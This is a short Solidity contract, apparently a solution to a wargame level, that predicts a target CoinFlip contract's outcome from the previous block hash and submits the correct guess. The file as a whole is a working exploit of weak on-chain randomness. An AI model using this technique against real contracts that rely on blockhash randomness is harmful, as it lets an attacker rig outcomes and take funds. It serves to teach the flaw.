// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract CoinFlipExploit{
    CoinFlip coinFlipContract;
    uint256 public FACTOR;

    constructor(address _coinFlipAddress, uint256 _factor){
        coinFlipContract = CoinFlip(_coinFlipAddress);
        FACTOR = _factor;
    }

    function exploit() public{
        uint256 blockValue = uint256(blockhash(block.number - 1));
        coinFlipContract.flip((blockValue / FACTOR) == 1 ? true : false);
    }
}
